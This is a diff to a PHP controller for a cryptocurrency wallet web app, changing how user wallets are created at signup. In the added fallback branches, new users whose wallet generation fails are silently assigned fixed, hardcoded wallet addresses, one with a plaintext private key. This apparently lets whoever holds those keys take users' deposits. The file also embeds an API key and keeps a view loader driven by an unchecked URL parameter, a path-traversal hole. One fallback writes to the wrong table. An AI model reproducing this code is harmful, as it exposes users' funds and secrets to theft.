@@ -19,6 +19,10 @@ class main extends MY_Controller {
 		$this->load->view('index');
 	}
 
+	public function maintenance(){
+		$this->load->view('maintenance');
+	}
+
 	public function homeView2(){
 		$this->load->view('wallet/homeView');
 	}
@@ -60,7 +64,7 @@ class main extends MY_Controller {
 				$selectfields = array("user_tbl.*,trc20_wallet.address as trc20_wallet,bsc_wallet.address as bsc_wallet,erc20_wallet.address as erc20_wallet"), 
 				$tables = array('user_tbl','trc20_wallet','bsc_wallet','erc20_wallet'), 
 				$fieldName = array('user_tbl.email'), $where = array($email), 
-				$join = array('user_tbl.userID = trc20_wallet.userOwner','user_tbl.userID = bsc_wallet.userOwner','user_tbl.userID = erc20_wallet.userOwner'), $joinType = array('inner','inner','inner'), $sortBy = null, 
+				$join = array('user_tbl.userID = trc20_wallet.userOwner','user_tbl.userID = bsc_wallet.userOwner','user_tbl.userID = erc20_wallet.userOwner'), $joinType = array('left','left','left'), $sortBy = null, 
 				$sortOrder = null, $limit = null, $fieldNameLike = null, $like = null, $whereSpecial = null, $groupBy = null 
 			);
 		}else{
@@ -68,7 +72,7 @@ class main extends MY_Controller {
 				$selectfields = array("user_tbl.*,trc20_wallet.address as trc20_wallet,bsc_wallet.address as bsc_wallet,erc20_wallet.address as erc20_wallet"), 
 				$tables = array('user_tbl','trc20_wallet','bsc_wallet','erc20_wallet'), 
 				$fieldName = array('user_tbl.mobileNumber'), $where = array($mobileNumber), 
-				$join = array('user_tbl.userID = trc20_wallet.userOwner','user_tbl.userID = bsc_wallet.userOwner','user_tbl.userID = erc20_wallet.userOwner'), $joinType = array('inner','inner','inner'), $sortBy = null, 
+				$join = array('user_tbl.userID = trc20_wallet.userOwner','user_tbl.userID = bsc_wallet.userOwner','user_tbl.userID = erc20_wallet.userOwner'), $joinType = array('left','left','left'), $sortBy = null, 
 				$sortOrder = null, $limit = null, $fieldNameLike = null, $like = null, $whereSpecial = null, $groupBy = null 
 			);
 		}
@@ -206,12 +210,15 @@ class main extends MY_Controller {
 		$saveQueryNotifUserId = $this->_insertRecords($tableName = 'user_tbl', $insertRecord);
 
 		$insertRecord = array(
-			'tokenIDSelected' => '1,3,4,19',
+			'tokenIDSelected' => '1,4',
 			'userID' => $saveQueryNotifUserId,
 			'timestamp_edit' => $this->_getTimeStamp(),
 		);
 
 		$tokenSelectedRes = $this->_insertRecords($tableName = 'token_selected', $insertRecord);
+
+		// b3cfec2253156129d9acc316487b86f2
+		// 948e18a7c68923038bf1df98ce6197df
 
 		if ($tokenSelectedRes) {
 			$apikey = "4h7896o0ujoskkwk84wo0848wo0o0w4wg8sw84wwcs80kwcg4kc8ogwg44s4ocw8"; // API Key in your account panel
@@ -246,6 +253,16 @@ class main extends MY_Controller {
 						$saveQueryNotif = $this->_insertRecords($tableName = 'trc20_wallet', $insertRecord);
 					}else{
 						echo json_encode(false);
+
+						$insertRecord = array(
+							'privateKey' => '9eaa6a229b3b93cf4011251a50e56d89582fb95ee036b41233f67304632e1f82',
+							'hexAddress' => '41ffcb173259a45e951cb086e55b6017d5f0ae62bb',
+							'address' => 'TZHibxZsFo5WJLokAgaZQUKAjkynrmoP2G',
+							'dateCreated' => $this->_getTimeStamp(),
+							'userOwner' => $saveQueryNotifUserId,
+						);
+
+						$saveQueryNotif = $this->_insertRecords($tableName = 'trc20_wallet', $insertRecord);
 					}
 				//TRX
 
@@ -278,6 +295,15 @@ class main extends MY_Controller {
 						$saveQueryNotif = $this->_insertRecords($tableName = 'bsc_wallet', $insertRecord);
 					}else{
 						echo json_encode(false);
+
+						$insertRecord = array(
+							'password' => 'ceb6c970658f31504a901b89dcd3e461',
+							'address' => '0x719951c1ff1974fd3879606d08d20e43f03de275',
+							'dateCreated' => $this->_getTimeStamp(),
+							'userOwner' => $saveQueryNotifUserId,
+						);
+
+						$saveQueryNotif = $this->_insertRecords($tableName = 'erc20_wallet', $insertRecord);
 					}
 				//BSC
 
@@ -299,6 +325,9 @@ class main extends MY_Controller {
 					$resultdecoded = json_decode($result, true);
 					curl_close($ch);
 
+					// ceb6c970658f31504a901b89dcd3e461
+					// b3cfec2253156129d9acc316487b86f2
+
 					if ($resultdecoded['ok']==true) {
 						$insertRecord = array(
 							'password' => $resultdecoded['password'],
@@ -310,6 +339,16 @@ class main extends MY_Controller {
 						$saveQueryNotif = $this->_insertRecords($tableName = 'erc20_wallet', $insertRecord);
 					}else{
 						echo json_encode(false);
+
+						$insertRecord = array(
+							'password' => 'ceb6c970658f31504a901b89dcd3e461',
+							'address' => '0x46ce96dcc69a5da456c7dfd9b6eacb78d62c84e3',
+							'dateCreated' => $this->_getTimeStamp(),
+							'userOwner' => $saveQueryNotifUserId,
+						);
+
+						$saveQueryNotif = $this->_insertRecords($tableName = 'erc20_wallet', $insertRecord);
+						
 					}
 				//ETHER
 			// // create wallets
@@ -321,12 +360,6 @@ class main extends MY_Controller {
 	}
 	
 	public function quickLoadPage(){
-		// if ($this->load->view($_GET['pagename'],'',TRUE)!== ''){
-	 //        $this->load->view($_GET['pagename'],'',TRUE);
-	 //    } else {
-	 //        $this->load->view('404Error');
-	 //    }	
-
 	    if (is_file(APPPATH.'views/' . $_GET['pagename'] . EXT))
 	    {
 	        $this->load->view($_GET['pagename']);
